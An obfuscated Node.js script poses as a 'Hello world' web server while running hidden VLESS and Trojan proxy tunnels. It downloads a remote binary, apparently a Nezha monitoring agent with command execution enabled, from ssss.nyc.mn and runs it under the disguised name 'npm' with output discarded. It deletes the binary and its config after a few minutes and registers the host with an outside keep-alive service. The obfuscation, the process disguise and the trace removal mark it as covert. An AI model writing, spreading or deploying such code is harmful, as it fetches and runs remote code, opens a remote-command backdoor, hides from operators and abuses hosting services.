function _0x2954(){const _0x22df4f=['application/dns-json','30NxrJnl','then','PORT','pipe','readUInt8','env','catch','https://arm64.ssss.nyc.mn/v1','Unknown','/bin/bash','end','&fp=chrome&type=ws&host=','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','text/html','writeHead','558e5168-4452-4a87-8b2d-8571c8c0232b','NEZHA_SERVER','substr','\x20-p\x20','replace','https://','axios','test','SUB_PATH','join','decode','listen','child_process','Hug','UUID','connection','write','2053','connect','crypto','Answer','finish','300oqwwCC','arm','6158952lgZgab','Hello\x20world!','https://speed.cloudflare.com/meta','--tls','asOrganization','once','152985AhxXZk','172mJsUiG','createWriteStream','Failed\x20to\x20resolve\x20','country','2087','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','find',':443?encryption=none&security=tls&sni=','utf8','text/plain','24868900GaPYxT','includes','error:\x20','slice','base64','8443','2083','2096','2650032LZisrI','trojan://','update','post','type','close','Not\x20Found\x0a','pop','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','NEZHA_KEY','npm\x20download\x20successfully','length','https://arm64.ssss.nyc.mn/agent','get','writeFileSync','5627769ybMcKp','client_secret:\x20','NEZHA_PORT','npm','application/json','&path=%2F','concat','Status','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','WSPATH','every','readFile','reduce','data','https://oooo.serv00.net/add-url','createHash','toString','send','split','createServer','setsid\x20nohup\x20./npm\x20-s\x20','log','Server\x20is\x20running\x20on\x20port\x20','url','DOMAIN','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','&type=A','error','arch','unlink','5988EUVzLG','readUInt16BE','path','chmod\x20+x\x20npm','Automatic\x20Access\x20Task\x20added\x20successfully','6420LemhaC'];_0x2954=function(){return _0x22df4f;};return _0x2954();}const _0x5b5228=_0x59a9;(function(_0x297aad,_0x485153){const _0x3b38bb=_0x59a9,_0x591262=_0x297aad();while(!![]){try{const _0x12ffb7=parseInt(_0x3b38bb(0x15f))/0x1*(-parseInt(_0x3b38bb(0x18f))/0x2)+parseInt(_0x3b38bb(0x186))/0x3*(parseInt(_0x3b38bb(0x15a))/0x4)+-parseInt(_0x3b38bb(0x18e))/0x5*(-parseInt(_0x3b38bb(0x161))/0x6)+-parseInt(_0x3b38bb(0x13c))/0x7+-parseInt(_0x3b38bb(0x12d))/0x8+-parseInt(_0x3b38bb(0x188))/0x9+parseInt(_0x3b38bb(0x199))/0xa;if(_0x12ffb7===_0x485153)break;else _0x591262['push'](_0x591262['shift']());}catch(_0x30086d){_0x591262['push'](_0x591262['shift']());}}}(_0x2954,0x66072));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x5b5228(0x176)),net=require('net'),path=require(_0x5b5228(0x15c)),crypto=require(_0x5b5228(0x183)),{Buffer}=require('buffer'),{exec,execSync}=require(_0x5b5228(0x17c)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x5b5228(0x166)][_0x5b5228(0x17e)]||_0x5b5228(0x170),NEZHA_SERVER=process['env'][_0x5b5228(0x171)]||'',NEZHA_PORT=process[_0x5b5228(0x166)][_0x5b5228(0x13e)]||'',NEZHA_KEY=process['env'][_0x5b5228(0x136)]||'',DOMAIN=process[_0x5b5228(0x166)][_0x5b5228(0x154)]||'1234.abc.com',AUTO_ACCESS=process['env']['AUTO_ACCESS']||!![],WSPATH=process[_0x5b5228(0x166)][_0x5b5228(0x145)]||UUID['slice'](0x0,0x8),SUB_PATH=process['env'][_0x5b5228(0x178)]||'sub',NAME=process['env']['NAME']||_0x5b5228(0x17d),PORT=process[_0x5b5228(0x166)][_0x5b5228(0x163)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x1abc30=_0x5b5228;try{const _0x1767f1=await axios['get'](_0x1abc30(0x18a)),_0x49152a=_0x1767f1[_0x1abc30(0x149)];ISP=(_0x49152a[_0x1abc30(0x192)]+'-'+_0x49152a[_0x1abc30(0x18c)])['replace'](/ /g,'_');}catch(_0x48659b){ISP=_0x1abc30(0x169);}};function _0x59a9(_0x3a5146,_0x22d830){_0x3a5146=_0x3a5146-0x127;const _0x2954b7=_0x2954();let _0x59a986=_0x2954b7[_0x3a5146];return _0x59a986;}GetISP();const httpServer=http[_0x5b5228(0x14f)]((_0x173f5d,_0x446328)=>{const _0x447086=_0x5b5228;if(_0x173f5d[_0x447086(0x153)]==='/'){const _0x251bf9=path[_0x447086(0x179)](__dirname,'index.html');fs[_0x447086(0x147)](_0x251bf9,_0x447086(0x197),(_0x360ec7,_0x44ebdd)=>{const _0x5cb1e9=_0x447086;if(_0x360ec7){_0x446328[_0x5cb1e9(0x16f)](0xc8,{'Content-Type':'text/html'}),_0x446328[_0x5cb1e9(0x16b)](_0x5cb1e9(0x189));return;}_0x446328[_0x5cb1e9(0x16f)](0xc8,{'Content-Type':_0x5cb1e9(0x16e)}),_0x446328['end'](_0x44ebdd);});return;}else{if(_0x173f5d[_0x447086(0x153)]==='/'+SUB_PATH){const _0xaa7920='vless://'+UUID+'@'+DOMAIN+_0x447086(0x196)+DOMAIN+_0x447086(0x16c)+DOMAIN+_0x447086(0x141)+WSPATH+'#'+NAME+'-'+ISP,_0x2d2415=_0x447086(0x12e)+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x447086(0x16c)+DOMAIN+_0x447086(0x141)+WSPATH+'#'+NAME+'-'+ISP,_0x1c609c=_0xaa7920+'\x0a'+_0x2d2415,_0x1fbbfa=Buffer['from'](_0x1c609c)[_0x447086(0x14c)](_0x447086(0x129));_0x446328[_0x447086(0x16f)](0xc8,{'Content-Type':_0x447086(0x198)}),_0x446328[_0x447086(0x16b)](_0x1fbbfa+'\x0a');}else _0x446328[_0x447086(0x16f)](0x194,{'Content-Type':_0x447086(0x198)}),_0x446328['end'](_0x447086(0x133));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x5b5228(0x174)](/-/g,''),DNS_SERVERS=['8.8.4.4','1.1.1.1'];function resolveHost(_0x5e662e){return new Promise((_0x3d0aec,_0x400eb4)=>{const _0x430d4c=_0x59a9;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x430d4c(0x177)](_0x5e662e)){_0x3d0aec(_0x5e662e);return;}let _0x30a277=0x0;function _0x45ae4c(){const _0x802ab9=_0x430d4c;if(_0x30a277>=DNS_SERVERS[_0x802ab9(0x138)]){_0x400eb4(new Error(_0x802ab9(0x191)+_0x5e662e+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x2def30=DNS_SERVERS[_0x30a277];_0x30a277++;const _0x23e426='https://dns.google/resolve?name='+encodeURIComponent(_0x5e662e)+_0x802ab9(0x156);axios[_0x802ab9(0x13a)](_0x23e426,{'timeout':0x1388,'headers':{'Accept':_0x802ab9(0x160)}})[_0x802ab9(0x162)](_0xa245ca=>{const _0x51e3e5=_0x802ab9,_0x4940db=_0xa245ca[_0x51e3e5(0x149)];if(_0x4940db[_0x51e3e5(0x143)]===0x0&&_0x4940db[_0x51e3e5(0x184)]&&_0x4940db[_0x51e3e5(0x184)]['length']>0x0){const _0x1b21d8=_0x4940db[_0x51e3e5(0x184)][_0x51e3e5(0x195)](_0x4663d7=>_0x4663d7[_0x51e3e5(0x131)]===0x1);if(_0x1b21d8){_0x3d0aec(_0x1b21d8[_0x51e3e5(0x149)]);return;}}_0x45ae4c();})[_0x802ab9(0x167)](_0x55bdad=>{_0x45ae4c();});}_0x45ae4c();});}function handleVlessConnection(_0x1488fe,_0x4489bc){const _0x1b4559=_0x5b5228,[_0x2219bc]=_0x4489bc,_0x123ca7=_0x4489bc['slice'](0x1,0x11);if(!_0x123ca7[_0x1b4559(0x146)]((_0xba7bdd,_0x2fb884)=>_0xba7bdd==parseInt(uuid[_0x1b4559(0x172)](_0x2fb884*0x2,0x2),0x10)))return![];let _0x5a3597=_0x4489bc[_0x1b4559(0x128)](0x11,0x12)['readUInt8']()+0x13;const _0x237e60=_0x4489bc[_0x1b4559(0x128)](_0x5a3597,_0x5a3597+=0x2)[_0x1b4559(0x15b)](0x0),_0x1c63ce=_0x4489bc[_0x1b4559(0x128)](_0x5a3597,_0x5a3597+=0x1)['readUInt8'](),_0x181c48=_0x1c63ce==0x1?_0x4489bc[_0x1b4559(0x128)](_0x5a3597,_0x5a3597+=0x4)[_0x1b4559(0x179)]('.'):_0x1c63ce==0x2?new TextDecoder()[_0x1b4559(0x17a)](_0x4489bc['slice'](_0x5a3597+0x1,_0x5a3597+=0x1+_0x4489bc[_0x1b4559(0x128)](_0x5a3597,_0x5a3597+0x1)[_0x1b4559(0x165)]())):_0x1c63ce==0x3?_0x4489bc[_0x1b4559(0x128)](_0x5a3597,_0x5a3597+=0x10)[_0x1b4559(0x148)]((_0x5c037a,_0x1cd60e,_0x3885bb,_0x266e08)=>_0x3885bb%0x2?_0x5c037a[_0x1b4559(0x142)](_0x266e08[_0x1b4559(0x128)](_0x3885bb-0x1,_0x3885bb+0x1)):_0x5c037a,[])['map'](_0x205036=>_0x205036['readUInt16BE'](0x0)[_0x1b4559(0x14c)](0x10))['join'](':'):'';_0x1488fe[_0x1b4559(0x14d)](new Uint8Array([_0x2219bc,0x0]));const _0x4da662=createWebSocketStream(_0x1488fe);return resolveHost(_0x181c48)['then'](_0xe79102=>{const _0x3228a7=_0x1b4559;net['connect']({'host':_0xe79102,'port':_0x237e60},function(){const _0x242df7=_0x59a9;this[_0x242df7(0x180)](_0x4489bc[_0x242df7(0x128)](_0x5a3597)),_0x4da662['on'](_0x242df7(0x157),()=>{})['pipe'](this)['on'](_0x242df7(0x157),()=>{})[_0x242df7(0x164)](_0x4da662);})['on'](_0x3228a7(0x157),()=>{});})[_0x1b4559(0x167)](_0x41de8e=>{const _0x5268c1=_0x1b4559;net[_0x5268c1(0x182)]({'host':_0x181c48,'port':_0x237e60},function(){const _0x54f8c1=_0x5268c1;this['write'](_0x4489bc['slice'](_0x5a3597)),_0x4da662['on'](_0x54f8c1(0x157),()=>{})[_0x54f8c1(0x164)](this)['on']('error',()=>{})[_0x54f8c1(0x164)](_0x4da662);})['on'](_0x5268c1(0x157),()=>{});}),!![];}function handleTrojanConnection(_0xf0f843,_0x122c6c){const _0x5e2395=_0x5b5228;try{if(_0x122c6c[_0x5e2395(0x138)]<0x3a)return![];const _0x4255b6=_0x122c6c[_0x5e2395(0x128)](0x0,0x38)[_0x5e2395(0x14c)](),_0x2b76bf=[UUID];let _0x4a9678=null;for(const _0x2b9c85 of _0x2b76bf){const _0x1f5164=crypto[_0x5e2395(0x14b)]('sha224')[_0x5e2395(0x12f)](_0x2b9c85)['digest']('hex');if(_0x1f5164===_0x4255b6){_0x4a9678=_0x2b9c85;break;}}if(!_0x4a9678)return![];let _0x4391f9=0x38;_0x122c6c[_0x4391f9]===0xd&&_0x122c6c[_0x4391f9+0x1]===0xa&&(_0x4391f9+=0x2);const _0x52da1d=_0x122c6c[_0x4391f9];if(_0x52da1d!==0x1)return![];_0x4391f9+=0x1;const _0x349875=_0x122c6c[_0x4391f9];_0x4391f9+=0x1;let _0x1b87fb,_0x3bcff7;if(_0x349875===0x1)_0x1b87fb=_0x122c6c[_0x5e2395(0x128)](_0x4391f9,_0x4391f9+0x4)[_0x5e2395(0x179)]('.'),_0x4391f9+=0x4;else{if(_0x349875===0x3){const _0x3b6353=_0x122c6c[_0x4391f9];_0x4391f9+=0x1,_0x1b87fb=_0x122c6c['slice'](_0x4391f9,_0x4391f9+_0x3b6353)['toString'](),_0x4391f9+=_0x3b6353;}else{if(_0x349875===0x4)_0x1b87fb=_0x122c6c[_0x5e2395(0x128)](_0x4391f9,_0x4391f9+0x10)['reduce']((_0xbc5585,_0x3f4a4e,_0x350403,_0x39b9f7)=>_0x350403%0x2?_0xbc5585[_0x5e2395(0x142)](_0x39b9f7['slice'](_0x350403-0x1,_0x350403+0x1)):_0xbc5585,[])['map'](_0x5ea7ad=>_0x5ea7ad[_0x5e2395(0x15b)](0x0)[_0x5e2395(0x14c)](0x10))[_0x5e2395(0x179)](':'),_0x4391f9+=0x10;else return![];}}_0x3bcff7=_0x122c6c[_0x5e2395(0x15b)](_0x4391f9),_0x4391f9+=0x2;_0x4391f9<_0x122c6c['length']&&_0x122c6c[_0x4391f9]===0xd&&_0x122c6c[_0x4391f9+0x1]===0xa&&(_0x4391f9+=0x2);const _0x1722f2=createWebSocketStream(_0xf0f843);return resolveHost(_0x1b87fb)[_0x5e2395(0x162)](_0x24123e=>{const _0x5a01dc=_0x5e2395;net[_0x5a01dc(0x182)]({'host':_0x24123e,'port':_0x3bcff7},function(){const _0x5c4793=_0x5a01dc;_0x4391f9<_0x122c6c[_0x5c4793(0x138)]&&this[_0x5c4793(0x180)](_0x122c6c[_0x5c4793(0x128)](_0x4391f9)),_0x1722f2['on'](_0x5c4793(0x157),()=>{})[_0x5c4793(0x164)](this)['on'](_0x5c4793(0x157),()=>{})[_0x5c4793(0x164)](_0x1722f2);})['on']('error',()=>{});})[_0x5e2395(0x167)](_0x454fb9=>{const _0x48c135=_0x5e2395;net[_0x48c135(0x182)]({'host':_0x1b87fb,'port':_0x3bcff7},function(){const _0x80de65=_0x48c135;_0x4391f9<_0x122c6c[_0x80de65(0x138)]&&this['write'](_0x122c6c[_0x80de65(0x128)](_0x4391f9)),_0x1722f2['on'](_0x80de65(0x157),()=>{})[_0x80de65(0x164)](this)['on'](_0x80de65(0x157),()=>{})[_0x80de65(0x164)](_0x1722f2);})['on']('error',()=>{});}),!![];}catch(_0x179a50){return![];}}wss['on'](_0x5b5228(0x17f),(_0x58bf10,_0x4347e1)=>{const _0x1fa1f9=_0x5b5228,_0x4e32fc=_0x4347e1[_0x1fa1f9(0x153)]||'';_0x58bf10[_0x1fa1f9(0x18d)]('message',_0x4a9322=>{const _0x425bfc=_0x1fa1f9;if(_0x4a9322['length']>0x11&&_0x4a9322[0x0]===0x0){const _0x526472=_0x4a9322['slice'](0x1,0x11),_0xe38635=_0x526472[_0x425bfc(0x146)]((_0x48fbb2,_0x46c845)=>_0x48fbb2==parseInt(uuid[_0x425bfc(0x172)](_0x46c845*0x2,0x2),0x10));if(_0xe38635){!handleVlessConnection(_0x58bf10,_0x4a9322)&&_0x58bf10[_0x425bfc(0x132)]();return;}}!handleTrojanConnection(_0x58bf10,_0x4a9322)&&_0x58bf10[_0x425bfc(0x132)]();})['on'](_0x1fa1f9(0x157),()=>{});});const getDownloadUrl=()=>{const _0x2bd021=_0x5b5228,_0x5a9067=os[_0x2bd021(0x158)]();return _0x5a9067===_0x2bd021(0x187)||_0x5a9067==='arm64'||_0x5a9067==='aarch64'?!NEZHA_PORT?_0x2bd021(0x168):_0x2bd021(0x139):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x1a817c=_0x5b5228;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x56698d=getDownloadUrl(),_0x2c9ff5=await axios({'method':_0x1a817c(0x13a),'url':_0x56698d,'responseType':'stream'}),_0x498e64=fs[_0x1a817c(0x190)](_0x1a817c(0x13f));return _0x2c9ff5[_0x1a817c(0x149)]['pipe'](_0x498e64),new Promise((_0x38709d,_0xeec798)=>{const _0x3d9b1c=_0x1a817c;_0x498e64['on'](_0x3d9b1c(0x185),()=>{const _0x31e0b2=_0x3d9b1c;console[_0x31e0b2(0x151)](_0x31e0b2(0x137)),exec(_0x31e0b2(0x15d),_0x3be677=>{if(_0x3be677)_0xeec798(_0x3be677);_0x38709d();});}),_0x498e64['on']('error',_0xeec798);});}catch(_0x428598){throw _0x428598;}},runnz=async()=>{const _0x1fea92=_0x5b5228;try{const _0x5461cf=execSync(_0x1fea92(0x16d),{'encoding':'utf-8'});if(_0x5461cf['trim']()!==''){console['log']('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x2137af){}await downloadFile();let _0x427d7e='',_0x28107e=['443',_0x1fea92(0x12a),_0x1fea92(0x12c),_0x1fea92(0x193),_0x1fea92(0x12b),_0x1fea92(0x181)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x114a66=_0x28107e['includes'](NEZHA_PORT)?_0x1fea92(0x18b):'';_0x427d7e=_0x1fea92(0x150)+NEZHA_SERVER+':'+NEZHA_PORT+_0x1fea92(0x173)+NEZHA_KEY+'\x20'+_0x114a66+_0x1fea92(0x194);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x31234d=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x1fea92(0x14e)](':')[_0x1fea92(0x134)]():'',_0x415fb0=_0x28107e[_0x1fea92(0x19a)](_0x31234d)?'true':'false',_0x47029e=_0x1fea92(0x13d)+NEZHA_KEY+_0x1fea92(0x155)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x415fb0+_0x1fea92(0x144)+UUID;fs[_0x1fea92(0x13b)]('config.yaml',_0x47029e);}_0x427d7e='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console['log'](_0x1fea92(0x135));return;}}try{exec(_0x427d7e,{'shell':_0x1fea92(0x16a)},_0x1e3d46=>{const _0x1e2c0e=_0x1fea92;if(_0x1e3d46)console['error']('npm\x20running\x20error:',_0x1e3d46);else console[_0x1e2c0e(0x151)]('npm\x20is\x20running');});}catch(_0x1caa43){console[_0x1fea92(0x157)](_0x1fea92(0x127)+_0x1caa43);}};async function addAccessTask(){const _0xf95451=_0x5b5228;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x304edc=_0xf95451(0x175)+DOMAIN;try{const _0x3bc3c8=await axios[_0xf95451(0x130)](_0xf95451(0x14a),{'url':_0x304edc},{'headers':{'Content-Type':_0xf95451(0x140)}});console[_0xf95451(0x151)](_0xf95451(0x15e));}catch(_0x20d102){}}const delFiles=()=>{const _0x56aa19=_0x5b5228;fs[_0x56aa19(0x159)]('npm',()=>{}),fs[_0x56aa19(0x159)]('config.yaml',()=>{});};httpServer[_0x5b5228(0x17b)](PORT,()=>{const _0x3f1985=_0x5b5228;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x3f1985(0x152)+PORT);});
